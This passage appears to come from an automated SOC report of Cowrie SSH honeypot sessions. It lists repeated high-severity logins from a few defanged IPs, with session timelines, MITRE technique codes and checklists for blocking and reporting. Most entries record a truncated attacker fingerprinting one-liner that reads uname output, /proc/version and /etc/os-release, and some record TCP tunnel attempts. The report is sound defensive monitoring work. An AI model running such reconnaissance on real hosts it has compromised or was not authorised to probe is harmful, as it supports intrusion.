- [ ] Submit `180.76.104[.]208` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b014ba205f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:07 |
| **Last Seen** | 2026-07-24 20:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:07:59` | `cowrie.session.connect` |
| `2026-07-24 20:08:00` | `cowrie.client.version` |
| `2026-07-24 20:08:00` | `cowrie.client.kex` |
| `2026-07-24 20:08:00` | `cowrie.login.success` |
| `2026-07-24 20:08:01` | `cowrie.session.params` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.success` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:01` | `cowrie.command.input` |
| `2026-07-24 20:08:02` | `cowrie.log.closed` |
| `2026-07-24 20:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b6719db181

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:08 |
| **Last Seen** | 2026-07-24 20:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:08:28` | `cowrie.session.connect` |
| `2026-07-24 20:08:28` | `cowrie.client.version` |
| `2026-07-24 20:08:28` | `cowrie.client.kex` |
| `2026-07-24 20:08:31` | `cowrie.login.success` |
| `2026-07-24 20:08:33` | `cowrie.session.params` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.success` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:33` | `cowrie.command.input` |
| `2026-07-24 20:08:34` | `cowrie.log.closed` |
| `2026-07-24 20:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f9e94c8f5a3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:09 |
| **Last Seen** | 2026-07-24 20:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:09:35` | `cowrie.session.connect` |
| `2026-07-24 20:09:36` | `cowrie.client.version` |
| `2026-07-24 20:09:36` | `cowrie.client.kex` |
| `2026-07-24 20:09:38` | `cowrie.login.success` |
| `2026-07-24 20:09:40` | `cowrie.session.params` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.success` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:40` | `cowrie.command.input` |
| `2026-07-24 20:09:41` | `cowrie.log.closed` |
| `2026-07-24 20:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aaa929c30a6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:09 |
| **Last Seen** | 2026-07-24 20:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:09:41` | `cowrie.session.connect` |
| `2026-07-24 20:09:41` | `cowrie.client.version` |
| `2026-07-24 20:09:41` | `cowrie.client.kex` |
| `2026-07-24 20:09:42` | `cowrie.login.success` |
| `2026-07-24 20:09:44` | `cowrie.session.params` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.success` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.command.input` |
| `2026-07-24 20:09:44` | `cowrie.log.closed` |
| `2026-07-24 20:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43c371baf4f

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-07-24 20:10 |
| **Last Seen** | 2026-07-24 20:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:10:22` | `cowrie.session.connect` |
| `2026-07-24 20:10:23` | `cowrie.client.version` |
| `2026-07-24 20:10:23` | `cowrie.client.kex` |
| `2026-07-24 20:10:25` | `cowrie.login.success` |
| `2026-07-24 20:10:25` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77a0f7f36129

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:10 |
| **Last Seen** | 2026-07-24 20:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:10:42` | `cowrie.session.connect` |
| `2026-07-24 20:10:42` | `cowrie.client.version` |
| `2026-07-24 20:10:42` | `cowrie.client.kex` |
| `2026-07-24 20:10:45` | `cowrie.login.success` |
| `2026-07-24 20:10:47` | `cowrie.session.params` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.success` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:47` | `cowrie.command.input` |
| `2026-07-24 20:10:48` | `cowrie.log.closed` |
| `2026-07-24 20:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-067d7d9ad3f4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:11 |
| **Last Seen** | 2026-07-24 20:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:11:18` | `cowrie.session.connect` |
| `2026-07-24 20:11:19` | `cowrie.client.version` |
| `2026-07-24 20:11:19` | `cowrie.client.kex` |
| `2026-07-24 20:11:20` | `cowrie.login.success` |
| `2026-07-24 20:11:21` | `cowrie.session.params` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.success` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.command.input` |
| `2026-07-24 20:11:21` | `cowrie.log.closed` |
| `2026-07-24 20:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92732e163fb7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:11 |
| **Last Seen** | 2026-07-24 20:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:11:48` | `cowrie.session.connect` |
| `2026-07-24 20:11:48` | `cowrie.client.version` |
| `2026-07-24 20:11:48` | `cowrie.client.kex` |
| `2026-07-24 20:11:52` | `cowrie.login.success` |
| `2026-07-24 20:11:54` | `cowrie.session.params` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.success` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.command.input` |
| `2026-07-24 20:11:54` | `cowrie.log.closed` |
| `2026-07-24 20:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-918c2918f45d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:12 |
| **Last Seen** | 2026-07-24 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:12:56` | `cowrie.session.connect` |
| `2026-07-24 20:12:56` | `cowrie.client.version` |
| `2026-07-24 20:12:56` | `cowrie.client.kex` |
| `2026-07-24 20:12:57` | `cowrie.login.success` |
| `2026-07-24 20:12:59` | `cowrie.session.params` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.success` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.command.input` |
| `2026-07-24 20:12:59` | `cowrie.log.closed` |
| `2026-07-24 20:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fdc083d003a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:12 |
| **Last Seen** | 2026-07-24 20:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:12:56` | `cowrie.session.connect` |
| `2026-07-24 20:12:57` | `cowrie.client.version` |
| `2026-07-24 20:12:57` | `cowrie.client.kex` |
| `2026-07-24 20:13:00` | `cowrie.login.success` |
| `2026-07-24 20:13:02` | `cowrie.session.params` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.success` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:02` | `cowrie.command.input` |
| `2026-07-24 20:13:03` | `cowrie.log.closed` |
| `2026-07-24 20:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8b78953945

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:14 |
| **Last Seen** | 2026-07-24 20:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:14:04` | `cowrie.session.connect` |
| `2026-07-24 20:14:04` | `cowrie.client.version` |
| `2026-07-24 20:14:04` | `cowrie.client.kex` |
| `2026-07-24 20:14:07` | `cowrie.login.success` |
| `2026-07-24 20:14:09` | `cowrie.session.params` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.success` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.command.input` |
| `2026-07-24 20:14:09` | `cowrie.log.closed` |
| `2026-07-24 20:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a55a9ac4b2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:14 |
| **Last Seen** | 2026-07-24 20:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:14:37` | `cowrie.session.connect` |
| `2026-07-24 20:14:37` | `cowrie.client.version` |
| `2026-07-24 20:14:37` | `cowrie.client.kex` |
| `2026-07-24 20:14:38` | `cowrie.login.success` |
| `2026-07-24 20:14:39` | `cowrie.session.params` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.success` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:39` | `cowrie.command.input` |
| `2026-07-24 20:14:40` | `cowrie.log.closed` |
| `2026-07-24 20:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57b03363f9e1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:15 |
| **Last Seen** | 2026-07-24 20:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
